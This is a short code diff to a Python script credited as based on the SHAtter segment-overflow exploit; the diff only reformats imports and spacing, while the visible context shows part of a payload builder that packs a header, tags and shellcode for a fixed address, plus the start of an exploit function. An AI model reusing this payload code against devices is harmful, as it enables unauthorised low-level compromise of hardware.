@@ -1,7 +1,11 @@
 # Credit: This file is based on SHAtter exploit (segment overflow) by posixninja and pod2g.
 
-import struct, sys, time
+import struct
+import sys
+import time
+
 import dfu
+
 
 def generate_payload():
     shellcode_address = 0x8402F198 + 1
@@ -12,6 +16,7 @@ def generate_payload():
         shellcode = f.read()
     assert len(shellcode) <= 1024
     return header + tags + shellcode
+
 
 def exploit():
     print('*** based on SHAtter exploit (segment overflow) by posixninja and pod2g ***')
